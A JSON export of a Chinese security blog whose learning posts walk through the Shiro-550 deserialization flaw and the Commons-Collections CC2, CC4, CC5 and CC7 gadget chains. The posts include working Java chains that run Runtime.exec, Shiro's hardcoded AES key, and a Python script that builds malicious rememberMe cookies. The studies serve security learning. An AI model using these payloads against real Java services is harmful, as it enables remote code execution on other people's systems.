{"meta":{"title":"Narcherの小窝","subtitle":"","description":"","author":"Narcher Alter","url":"http://example.com","root":"/"},"pages":[],"posts":[{"title":"JAVA安全:Shiro-550反序列化","slug":"JAVA安全shiro-550反序列化漏洞分析","date":"2024-03-21T01:24:07.191Z","updated":"2024-03-23T14:03:34.190Z","comments":true,"path":"2024/03/21/JAVA安全shiro-550反序列化漏洞分析/","link":"","permalink":"http://example.com/2024/03/21/JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","excerpt":"作者：Narcher 时间：2024&#x2F;3&#x2F;23 分类：Vulnerability Analysis","text":"作者：Narcher 时间：2024&#x2F;3&#x2F;23 分类：Vulnerability Analysis 前言Apache Shiro是一个开源的Java安全框架，可执行身份验证、授权、密码和会话管理。Shiro-550的漏洞最早披露于2016年，影响版本为：shiro&lt;1.2.4，特征：返回包的http头中包含Set-Cookie: rememberMe&#x3D;deleteMe emmm….直接开始学习吧 正文1.环境搭建&lt;1&gt;直接下载shiro-1.2.4 https://codeload.github.com/apache/shiro/zip/shiro-root-1.2.4 &lt;2&gt;打开IDEA，将shiro-shiro-root-1.2.4的samples下的web包以Maven的形式导入即可 &lt;3&gt;更改pom.xml文件中的jstl配置，增加1.2版本设置，如下： &lt;4&gt;配置好IDEA内置的tomcat服务，启动即可，成功后效果如下： 2.调试Shiro的加解密实际上是一对，从名字也很容易看出来： 2.1 加密分析直接把断点打在org.apache.shiro.mgt.AbstractRememberMeManager类的onSuccessfulLogin方法中： 然后我们开始调试运行，登录root:secret账号，并勾选RememberMe选项，点击Login，转入IDEA开始分析 可见程序停在了我们的断点处，我们继续跟进： 此时进入了rememberIdentity方法，我们继续跟进： 在getIdentityToRemember方法中返回了用户名root，并给principals赋值，接着进入重写的rememberIdentity方法： 到这一步就开始对用户名root进行操作了，我们继续跟进： 可见这里对root进行了序列化，并赋值给字节数组，之后在encrypt中进行加密操作，我们继续跟进： 进入encrypt方法之后，看起来像是对序列化之后的用户名进行了加密操作，我们来看一下cipherService： 很明显，对序列化之后的用户名进行了AES加密，我们跟进来看一下AES加密的Key值： 这个encryptionCipherKey的赋值可以看一下： 可见Key实际上就是一个固定的值：kPH+bIxk5D2deZiIxcaaaA==的base64解码 确定了AES加密的Key之后我们继续跟进，之后便是一系列的加密过程，我们在这里直接省略，直接看加密完成后的流程： 直接从convertPrincipalsToBytes方法return values回到rememberIdentity，然后我们继续跟进： 之后便是对加密后的值进行base64编码，然后设置到cookie之中 总结流程： &lt;1&gt;用户名序列化 &lt;2&gt;AES加密 &lt;3&gt;base64加密 &lt;4&gt;将加密结果放到cookie的rememberMe上 2.2 解密分析注意：解密的时候请求头中注意删掉JSESSIONID，否则不会进行解密流程！！！ 直接把断点打在org.apache.shiro.mgt.DefaultSecurityManager的getRememberedIdentity方法中： 这里我们重点跟进getRememberedPrincipals方法： 这里我们比较感兴趣的是getRememberedSerializedIdentity方法和convertBytesToPrincipals方法，我们逐个跟进一下： 看起来很长，实际上就是进行两个主要的操作，一个是获取cookie中的base64信息，另一个就是进行base64解密并返回，我们再跟进convertBytesToPrincipals方法看一下： 可以看到就是一个AES解密加一个反序列化，最终返回我们的用户名root 可见以root的身份登录： 总结流程： &lt;1&gt;读取cookie中的rememberMe的值 &lt;2&gt;对值进行base64解密 &lt;3&gt;对解密结果进行AES解密+反序列化得到用户名 3.漏洞利用解密流程中对cookie中的rememberMe的值最终进行了反序列化操作，那么我们只要传入前边学过的反序列化触发的链子便可以进行命令执行 3.1 URLDNS链由于URLDNS链基本上都是用的Java内置类实现的，所以应用范围较广，但也就只能用来发起DNS请求，我们来试一下： 这里我直接把之前学的URLDNS链原封不动拿过来了： 1234567891011HashMap&lt;URL,Integer&gt; hashMap = new HashMap&lt;URL,Integer&gt;();URL url = new URL(&quot;http://ob328eym9gl464dbs50lp5unwe24qt.burpcollaborator.net&quot;);Class c = url.getClass();Field hashcode = c.getDeclaredField(&quot;hashCode&quot;);hashcode.setAccessible(true);hashcode.set(url,1);hashMap.put(url,1);hashcode.set(url,-1);//序列化ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\URLDNS.txt&quot;));oos.writeObject(hashMap); 之后就是对序列化后的数据进行AES加密和base64加密： 1234567891011121314151617181920import sysimport uuidimport base64from Crypto.Cipher import AESdef encode_rememberme(): f = open(&#x27;URLDNS.txt&#x27;,&#x27;rb&#x27;) BS = AES.block_size pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode() key = base64.b64decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;) iv = uuid.uuid4().bytes encryptor = AES.new(key, AES.MODE_CBC, iv) file_body = pad(f.read()) base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body)) return base64_ciphertextif __name__ == &#x27;__main__&#x27;: payload = encode_rememberme() print(&quot;rememberMe=&#123;0&#125;&quot;.format(payload.decode())) 然后打就完了： 成功 3.2 CC链如果是按照上述环境搭建的流程来的话，因为shiro本身是不带CC依赖的，所以到这一步需要加一个CC依赖： 12345&lt;dependency&gt; &lt;groupId&gt;commons-collections&lt;/groupId&gt; &lt;artifactId&gt;commons-collections&lt;/artifactId&gt; &lt;version&gt;3.2.1&lt;/version&gt;&lt;/dependency&gt; 之后呢，如果我们正常拿CC链来打的话是打不通的（tomcat的类加载器里边不支持数组类的加载），当然，如果你的CC依赖是CC4的话，是可以直接拿CC2来打的，我们这里用的是CC3的依赖，CC2打不了，就需要构造自己的链子来把Transformer数组给去掉，我在这里学的是白日梦组长的链子，思路相当于之前学过的CC3、CC6、CC2的集合，忘记了的话可以去看一下前面的知识： 123456789101112131415161718192021222324252627TemplatesImpl templates = new TemplatesImpl();Class tc = templates.getClass();Field nameField = tc.getDeclaredField(&quot;_name&quot;);nameField.setAccessible(true);nameField.set(templates,&quot;aaaa&quot;);Field bytecodesField = tc.getDeclaredField(&quot;_bytecodes&quot;);bytecodesField.setAccessible(true);byte[] code = Files.readAllBytes(Paths.get(&quot;C://Users//Narcher//IdeaProjects//CC3_test.class&quot;));byte[][] codes = &#123;code&#125;;bytecodesField.set(templates,codes);Field tfactoryField = tc.getDeclaredField(&quot;_tfactory&quot;);tfactoryField.setAccessible(true);tfactoryField.set(templates, new TransformerFactoryImpl());InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;newTransformer&quot;, null, null);HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;();Map&lt;Object,Object&gt; innerMap = LazyMap.decorate(map, new ConstantTransformer(1));TiedMapEntry tiedMapEntry = new TiedMapEntry(innerMap, templates);HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();hashMap.put(tiedMapEntry, &quot;bbb&quot;);innerMap.remove(templates);Class c = LazyMap.class;Field factoryField = c.getDeclaredField(&quot;factory&quot;);factoryField.setAccessible(true);factoryField.set(innerMap,invokerTransformer);//序列化ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\shiro_CC.txt&quot;));oos.writeObject(hashMap); 1234567891011121314151617181920import sysimport uuidimport base64from Crypto.Cipher import AESdef encode_rememberme(): f = open(&#x27;shiro_CC.txt&#x27;,&#x27;rb&#x27;) BS = AES.block_size pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode() key = base64.b64decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;) iv = uuid.uuid4().bytes encryptor = AES.new(key, AES.MODE_CBC, iv) file_body = pad(f.read()) base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body)) return base64_ciphertextif __name__ == &#x27;__main__&#x27;: payload = encode_rememberme() print(&quot;rememberMe=&#123;0&#125;&quot;.format(payload.decode())) 是能够打的通的： 3.3 CB链上边也说了，shiro原生是不带CC依赖的，所以打原生就要用到CB了，如果是按上述流程搭建的环境，那么shiro自带的CB是1.8.3版本的，我们接下来看看链子应该怎么构造： 首先，CB链最后的命令执行流程还是和CC3是一样的，因为利用的是Java的反射机制和动态类加载的特性，我们先把前边的拿过来： 12345678910111213TemplatesImpl templates = new TemplatesImpl();Class tc = templates.getClass();Field nameField = tc.getDeclaredField(&quot;_name&quot;);nameField.setAccessible(true);nameField.set(templates,&quot;aaaa&quot;);Field bytecodesField = tc.getDeclaredField(&quot;_bytecodes&quot;);bytecodesField.setAccessible(true);byte[] code = Files.readAllBytes(Paths.get(&quot;C://Users//Narcher//IdeaProjects//CC3_test.class&quot;));byte[][] codes = &#123;code&#125;;bytecodesField.set(templates,codes);Field tfactoryField = tc.getDeclaredField(&quot;_tfactory&quot;);tfactoryField.setAccessible(true);tfactoryField.set(templates, new TransformerFactoryImpl()); 按原先CC3的步骤，我们是直接利用TrAXfilter类进行templates的newTransformer方法的触发，但这里我们CB依赖里是没有这个类的，因此我们就要从TemplatesImpl类中找一下能命令执行的点，实际上这里用的就是CB中的PropertyUtils.getProperty方法，它能够获取类的实例化对象中的JavaBean格式的方法，而TemplatesImpl类中恰好有符合JavaBean格式，且能够利用的方法： 而PropertyUtils类是没有继承序列化接口的，我们需要在CB依赖中找到一个调用PropertyUtils.getProperty方法的类且继承了序列化接口，这里我们使用BeanComparator类，其中有着compare方法： 这部分的链子应该这样写： 1BeanComparator beanComparator = new BeanComparator(&quot;outputProperties&quot;, new AttrCompare()); 至于为什么要传AttrCompare类的实例，可以看一下BeanComparator构造器的源码： 其中的ComparableComparator类来自于CC依赖，在shiro原生中是没有的，所以我们就用了一个即在CB依赖中有，又继承了序列化接口的类。 接下来寻找调用compare方法的类，是不是很熟悉了？ 没错，在之前的CC4链的学习中，我们就用了compare方法来触发ChainedTransformer的transform方法，那么我们去再看一看那个compare方法： 可见其不仅调用了transform方法，还调用了compare方法，我们只需要把decorated传成我们构造好的BeanComparator类的实例就好了，只需要把CC4中传入priorityQueue的transformingComparator改成beanComparator就好了，接下来的流程就和CC4后边一样了，我们直接拿过来： 12345678910111213141516171819202122232425TemplatesImpl templates = new TemplatesImpl();Class tc = templates.getClass();Field nameField = tc.getDeclaredField(&quot;_name&quot;);nameField.setAccessible(true);nameField.set(templates,&quot;aaaa&quot;);Field bytecodesField = tc.getDeclaredField(&quot;_bytecodes&quot;);bytecodesField.setAccessible(true);byte[] code = Files.readAllBytes(Paths.get(&quot;C://Users//Narcher//IdeaProjects//CC3_test.class&quot;));byte[][] codes = &#123;code&#125;;bytecodesField.set(templates,codes);Field tfactoryField = tc.getDeclaredField(&quot;_tfactory&quot;);tfactoryField.setAccessible(true);tfactoryField.set(templates, new TransformerFactoryImpl());BeanComparator beanComparator = new BeanComparator(&quot;outputProperties&quot;, new AttrCompare());TransformingComparator transformingComparator = new TransformingComparator&lt;&gt;(new ConstantTransformer&lt;&gt;(1));PriorityQueue priorityQueue = new PriorityQueue&lt;&gt;(transformingComparator);priorityQueue.add(templates);priorityQueue.add(2);Class&lt;PriorityQueue&gt; c = PriorityQueue.class;Field comparatorField = c.getDeclaredField(&quot;comparator&quot;);comparatorField.setAccessible(true);comparatorField.set(priorityQueue,beanComparator);//序列化ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\shiro_CB.txt&quot;));oos.writeObject(priorityQueue); 最后打一下看看： 成功执行","categories":[],"tags":[]},{"title":"JAVA安全:CC7链","slug":"JAVA安全CC7链","date":"2024-03-19T13:39:27.499Z","updated":"2024-03-20T07:33:54.594Z","comments":true,"path":"2024/03/19/JAVA安全CC7链/","link":"","permalink":"http://example.com/2024/03/19/JAVA%E5%AE%89%E5%85%A8CC7%E9%93%BE/","excerpt":"作者：Narcher 时间：2024&#x2F;3&#x2F;20 分类：Vulnerability Analysis","text":"作者：Narcher 时间：2024&#x2F;3&#x2F;20 分类：Vulnerability Analysis 前言作为CC链系列的最后一条，当然要放到最后学啦 正文我们先来看一下ysoserial中的CC7链流程： 这里是在LazyMap的get方法之前发生了变化，我们还是按照之前的思路，一点点分析 1.AbstractMap部分从调用get方法的类里边找，找到了AbstractMap类，它的equals方法调用了get方法： m对象是我们传入的参数，可控，我们继续向上找 2.AbstractMapDecorator部分 发现AbstractMapDecorator类的equals方法调用了equals方法，且其构造器如下： map参数可控，我们继续往上找 3.HashTable部分 HashTable类的reconstitutionPut方法对equals方法进行了调用，看起来流程也很简单，就是对增加的key进行hash计算，如果hash值与tab中的所有元素均不同，就会增加到数组tab中，否则就会报异常 我们再看看调用该方法的部分： HashTable类中的readObject方法，看到这里我们就大功告成了，HashTable类完全可以作为链子的结尾。我们来构造链子 4.构造链首先，LazyMap之前的部分由于和CC1链相同，我们就直接copy过来： 1234567Transformer[] transformers=new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getDeclaredMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;), new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;), new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)&#125;;ChainedTransformer chainedTransformer= new ChainedTransformer(transformers); 接下来我们按照链子触发的顺序来写链子 4.1 HashTable部分HashTable的readObject方法会直接用reconstitutionPut方法来读取序列化数据，我们要利用reconstitutionPut方法触发其中的equals方法，就需要进入其for循环的if判断，而且需要if判断的第一个判断（二者hash值相同）通过，因此我们需要至少传入两个hash值相同的LazyMap，那么我们就需要控制LazyMap的key和value值，网上key的hash相同的有yy和zZ或AaAaAa和BBAaBB等，我们随便选一组作为两个LazyMap的key值即可 这里调用的e.key.equals(key)要特别注意一下，e指的是数组tab，e.key的key指的是传入的第一个LazyMap，equals(key)中的key指的是传入的第二个LazyMap，我们就是要用第二个LazyMap触发命令执行 4.2 AbstractMapDecorator部分由于LazyMap没有equals方法，所以会调用LazyMap的父类AbstractMapDecorator中的equals方法 （这里其实就是把上边的图复制下来了，因为流程是一样的，只是反过来了） 这里我们传入了LazyMap，其this.map指的是LazyMap中传入的HashMap，看不懂的话可以调试一下 之后触发HashMap的equals方法 4.3AbstractMap部分HashMap也没有equals方法，因此也会调用其父类的equals方法 这时里边传入的o对象其实还是我们刚开始传入的第二个LazyMap对象，经过上边的一系列判断便可调用LazyMap的get方法，之后便会触发如同CC1链一样的流程而进行命令执行。 4.4 链子展示123456789101112131415161718192021222324252627Transformer[] transformers=new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getDeclaredMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;), new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;), new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)&#125;;ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]&#123;&#125;);HashMap&lt;Object,Object&gt; innerMap1 = new HashMap&lt;&gt;();HashMap&lt;Object,Object&gt; innerMap2 = new HashMap&lt;&gt;();Map lazyMap1 = LazyMap.decorate(innerMap1, chainedTransformer);Map lazyMap2 = LazyMap.decorate(innerMap2, chainedTransformer);lazyMap1.put(&quot;yy&quot;,1);lazyMap2.put(&quot;zZ&quot;,1);Hashtable hashtable = new Hashtable();hashtable.put(lazyMap1, 1);hashtable.put(lazyMap2, 1);Class c = chainedTransformer.getClass();Field iTransformersField = c.getDeclaredField(&quot;iTransformers&quot;);iTransformersField.setAccessible(true);iTransformersField.set(chainedTransformer, transformers);lazyMap2.remove(&quot;yy&quot;);//序列化ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC7.txt&quot;));oos.writeObject(hashtable);//反序列化ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC7.txt&quot;));ois.readObject(); 小结学了将近一周，可算是把CC链系列搞完了，也算是入门了Java安全，之后会继续学习Java安全相关，努力成web高手！！！","categories":[],"tags":[]},{"title":"JAVA安全:CC5链","slug":"JAVA安全CC5链","date":"2024-03-19T13:38:03.242Z","updated":"2024-03-19T13:56:38.267Z","comments":true,"path":"2024/03/19/JAVA安全CC5链/","link":"","permalink":"http://example.com/2024/03/19/JAVA%E5%AE%89%E5%85%A8CC5%E9%93%BE/","excerpt":"作者：Narcher 时间：2024&#x2F;3&#x2F;19 分类：Vulnerability Analysis","text":"作者：Narcher 时间：2024&#x2F;3&#x2F;19 分类：Vulnerability Analysis 前言CC5的限制比较多，对于jdk版本以及必须WITHOUT a security manager 实际上这个CC5链和CC1很像啊，只是改变了LazyMap的get方法的触发方式，为了记录学习过程，还是写下来吧。 正文先看一下ysoserial的CC5流程： 由于和CC1链很像，我们就先把CC1复制过来看看： 1234567891011121314151617181920212223Transformer[] transformers=new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getDeclaredMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;), new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;), new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)&#125;;ChainedTransformer chainedTransformer= new ChainedTransformer(transformers);HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;();map.put(&quot;value&quot;,&quot;value&quot;);LazyMap innerMap = (LazyMap) LazyMap.decorate(map, chainedTransformer);//反射获取AnnotationInvocationHandler类Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);Constructor constructor = c.getDeclaredConstructor(Class.class, Map.class);constructor.setAccessible(true);InvocationHandler handler = (InvocationHandler) constructor.newInstance(Target.class,innerMap);Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]&#123;Map.class&#125;,handler);handler = (InvocationHandler) constructor.newInstance(Target.class, proxyMap);//序列化ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC1.txt&quot;));oos.writeObject(handler);//反序列化ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC1.txt&quot;));ois.readObject(); 我们需要改的就是LazyMap的后边，先看看调用get方法的类吧 1.TiedMapEntry部分 可见TiedMapEntry的getValue方法调用了get方法，可作为一个点，我们继续往上找： 可见其toString方法调用了getValue方法，我们再往上找 2.BadAttributeValueExpException部分 可见BadAttributeValueExpException的readObject方法调用了toString方法，我们接下来只需要让valObj是我们传入的TiedMapEntry实例就行了，我们来看看valObj怎么来的： 12ObjectInputStream.GetField gf = ois.readFields();Object valObj = gf.get(&quot;val&quot;, null); 说白了，valObj的值就是从输入流ois中读取的对象的”val”字段的值。如果该字段不存在或者值为null，valObj的值就会是null。 那么怎么控制val呢？如果直接在构造器中调用的话，那么在构造的时候就会直接触发这条链子，很简单，用反射不就是了 12345BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);Class c = badAttributeValueExpException.getClass();Field valField = c.getDeclaredField(&quot;val&quot;);valField.setAccessible(true);valField.set(badAttributeValueExpException, tiedMapEntry); 3.构造链把上边的直接改到CC1链子里就行了： 1234567891011121314151617181920212223Transformer[] transformers=new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getDeclaredMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;), new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;), new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)&#125;;ChainedTransformer chainedTransformer= new ChainedTransformer(transformers);HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;();map.put(&quot;value&quot;,&quot;value&quot;);LazyMap innerMap = (LazyMap) LazyMap.decorate(map, chainedTransformer);//反射获取AnnotationInvocationHandler类TiedMapEntry tiedMapEntry = new TiedMapEntry(innerMap, &quot;aaa&quot;);BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);Class c = badAttributeValueExpException.getClass();Field valField = c.getDeclaredField(&quot;val&quot;);valField.setAccessible(true);valField.set(badAttributeValueExpException, tiedMapEntry);//序列化ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC1.txt&quot;));oos.writeObject(badAttributeValueExpException);//反序列化ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC1.txt&quot;));ois.readObject(); CC5就完成了。","categories":[],"tags":[]},{"title":"JAVA安全:CC2链","slug":"JAVA安全CC2链","date":"2024-03-19T09:53:13.362Z","updated":"2024-03-19T14:35:25.267Z","comments":true,"path":"2024/03/19/JAVA安全CC2链/","link":"","permalink":"http://example.com/2024/03/19/JAVA%E5%AE%89%E5%85%A8CC2%E9%93%BE/","excerpt":"作者：Narcher 时间：2024&#x2F;3&#x2F;19 分类：Vulnerability Analysis","text":"作者：Narcher 时间：2024&#x2F;3&#x2F;19 分类：Vulnerability Analysis 前言CC2这条链和CC4很像，只是改变了原先的ChainedTransformer的地方。CC2作为CC链中唯一不用数组的链子，其作用听白日梦组长说是为了防止某些中间件重写类加载的流程，导致数组可能会加载不到。同时，CC1链在jdk8u71以上的版本因为AnnotationInvocationHandler类的readObject方法被修复了 正文emmm… 我们还是先看一下ysoserial中的CC2流程： 基本上是和CC4是一样的，我们只需要更改ChainedTTransformer就好了： 1.InvokerTransformer部分先把CC4贴出来： 123456789101112131415161718192021222324252627282930313233TemplatesImpl templates = new TemplatesImpl();Class tc = templates.getClass();Field nameField = tc.getDeclaredField(&quot;_name&quot;);nameField.setAccessible(true);nameField.set(templates,&quot;aaaa&quot;);Field bytecodesField = tc.getDeclaredField(&quot;_bytecodes&quot;);bytecodesField.setAccessible(true);byte[] code = Files.readAllBytes(Paths.get(&quot;C://Users//Narcher//IdeaProjects//CC3_test.class&quot;));byte[][] codes = &#123;code&#125;;bytecodesField.set(templates,codes);Field tfactoryField = tc.getDeclaredField(&quot;_tfactory&quot;);tfactoryField.setAccessible(true);tfactoryField.set(templates, new TransformerFactoryImpl());// templates.newTransformer();Transformer[] transformers=new Transformer[]&#123; new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;templates&#125;)&#125;;ChainedTransformer chainedTransformer= new ChainedTransformer(transformers);TransformingComparator transformingComparator = new TransformingComparator&lt;&gt;(new ConstantTransformer&lt;&gt;(1));PriorityQueue priorityQueue = new PriorityQueue&lt;&gt;(transformingComparator);priorityQueue.add(1);priorityQueue.add(2);Class c = transformingComparator.getClass();Field transformerField = c.getDeclaredField(&quot;transformer&quot;);transformerField.setAccessible(true);transformerField.set(transformingComparator, chainedTransformer);//序列化ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC4.txt&quot;));oos.writeObject(priorityQueue);//反序列化ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC4.txt&quot;));ois.readObject(); 将CC4中的： 1234Transformer[] transformers=new Transformer[]&#123; new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;templates&#125;)&#125;; 改成： 1InvokerTransformer&lt;Object, Object&gt; invokerTransformer = new InvokerTransformer(&quot;newTransformer&quot;,new Class[]&#123;&#125;,new Object[]&#123;&#125;); 相当于绕过了TrAXFilter和InstantiateTransformer，将其替换成了InvokerTransformer，进一步地沟通了TransformingComparator和 TemplatesImpl 2.传入templates目前我们的链子是这样的： 12345678910111213141516171819202122232425262728TemplatesImpl templates = new TemplatesImpl();Class tc = templates.getClass();Field nameField = tc.getDeclaredField(&quot;_name&quot;);nameField.setAccessible(true);nameField.set(templates,&quot;aaaa&quot;);Field bytecodesField = tc.getDeclaredField(&quot;_bytecodes&quot;);bytecodesField.setAccessible(true);byte[] code = Files.readAllBytes(Paths.get(&quot;C://Users//Narcher//IdeaProjects//CC3_test.class&quot;));byte[][] codes = &#123;code&#125;;bytecodesField.set(templates,codes);Field tfactoryField = tc.getDeclaredField(&quot;_tfactory&quot;);tfactoryField.setAccessible(true);tfactoryField.set(templates, new TransformerFactoryImpl());InvokerTransformer&lt;Object, Object&gt; invokerTransformer = new InvokerTransformer(&quot;newTransformer&quot;,new Class[]&#123;&#125;,new Object[]&#123;&#125;);TransformingComparator transformingComparator = new TransformingComparator&lt;&gt;(new ConstantTransformer&lt;&gt;(1));PriorityQueue priorityQueue = new PriorityQueue&lt;&gt;(transformingComparator);priorityQueue.add(1);priorityQueue.add(2);Class c = transformingComparator.getClass();Field transformerField = c.getDeclaredField(&quot;transformer&quot;);transformerField.setAccessible(true);transformerField.set(transformingComparator, invokerTransformer);//序列化ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC4.txt&quot;));oos.writeObject(priorityQueue);//反序列化ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC4.txt&quot;));ois.readObject(); 因为ChainedTransformer被替换掉了，其中的ConstantTransformer自然也是没了，我们就需要传参了，先运行一下看看哪里报错，我们进去调试查看需要传参的地方即可： 报错整数类型的对象没有newTransformer方法，再看看我们的链子，是不是突然明白该改哪里了呢？ 我们将add的内容改为templates即可： 12345678910111213141516171819202122232425262728TemplatesImpl templates = new TemplatesImpl();Class tc = templates.getClass();Field nameField = tc.getDeclaredField(&quot;_name&quot;);nameField.setAccessible(true);nameField.set(templates,&quot;aaaa&quot;);Field bytecodesField = tc.getDeclaredField(&quot;_bytecodes&quot;);bytecodesField.setAccessible(true);byte[] code = Files.readAllBytes(Paths.get(&quot;C://Users//Narcher//IdeaProjects//CC3_test.class&quot;));byte[][] codes = &#123;code&#125;;bytecodesField.set(templates,codes);Field tfactoryField = tc.getDeclaredField(&quot;_tfactory&quot;);tfactoryField.setAccessible(true);tfactoryField.set(templates, new TransformerFactoryImpl());InvokerTransformer&lt;Object, Object&gt; invokerTransformer = new InvokerTransformer(&quot;newTransformer&quot;,new Class[]&#123;&#125;,new Object[]&#123;&#125;);TransformingComparator transformingComparator = new TransformingComparator&lt;&gt;(new ConstantTransformer&lt;&gt;(1));PriorityQueue priorityQueue = new PriorityQueue&lt;&gt;(transformingComparator);priorityQueue.add(templates);priorityQueue.add(templates);Class c = transformingComparator.getClass();Field transformerField = c.getDeclaredField(&quot;transformer&quot;);transformerField.setAccessible(true);transformerField.set(transformingComparator, invokerTransformer);//序列化ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC4.txt&quot;));oos.writeObject(priorityQueue);//反序列化ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC4.txt&quot;));ois.readObject(); CC2就这样完成了","categories":[],"tags":[]},{"title":"JAVA安全:CC4链","slug":"JAVA安全CC4链","date":"2024-03-19T03:43:21.919Z","updated":"2024-03-19T09:52:30.841Z","comments":true,"path":"2024/03/19/JAVA安全CC4链/","link":"","permalink":"http://example.com/2024/03/19/JAVA%E5%AE%89%E5%85%A8CC4%E9%93%BE/","excerpt":"作者：Narcher 时间：2024&#x2F;3&#x2F;19 分类：Vulnerability Analysis","text":"作者：Narcher 时间：2024&#x2F;3&#x2F;19 分类：Vulnerability Analysis 前言经过前几条链子的学习积累，CC4的学习可以说是轻松了很多。CC4这条链子和前边的不同之处在于commons-collections由原先的大版本3改成了大版本4，也就是说作用范围不同。 本质上来看，CC4和之前CC3的区别在于更改了前边的触发方式，由AnnotationInvocationHandler的readObject-&gt;Proxy-&gt;AnnotationInvocationHandler的invoke-&gt;LazyMap的get+一系列transform变为了PriorityQueue的readObject-&gt;PriorityQueue的heapify-&gt;PriorityQueue的siftDown-&gt;PriorityQueue的siftDownUsingComparator-&gt;TransformingComparator的compare+一系列transform。实际上还是换汤不换药，我们直接进入正文。 正文先来看一下ysoserial中的链子构造： 知道了大致思路，我们就自己来从头写一遍。 1.TransformingComparator部分思路先捋一捋，我们在commons-collections4中，原先的CC3链子在ChainedTransformer之后就断掉了，因此我们要找一个能够触发transform方法的类作为LazyMap的替代，于是便找到了TransformingComparator： 可见TransformingComparator的compare方法调用了transform方法，我们接下来只需要确保构造时传入构造好的chainedTransformer就好了，至于compare的参数并不是有用的，因为我们的ConstantTransformer太强了。 之后便是寻找调用compare方法的类，这里CC4作者直接用了内部类。 2.PriorityQueue部分 可见PriorityQueue的siftDownUsingComparator调用了compare方法，我们再往上找，找到了PriorityQueue的siftDown方法： 接着往上找，找到PriorityQueue的heapify方法： 再往上找，就找到了PriorityQueue的readObject方法了： 实际上，这样子就基本上大功告成了，我们来构造链子。 3.构造链3.1 拼接至于CC3的后半部分，我就全拿过来了： 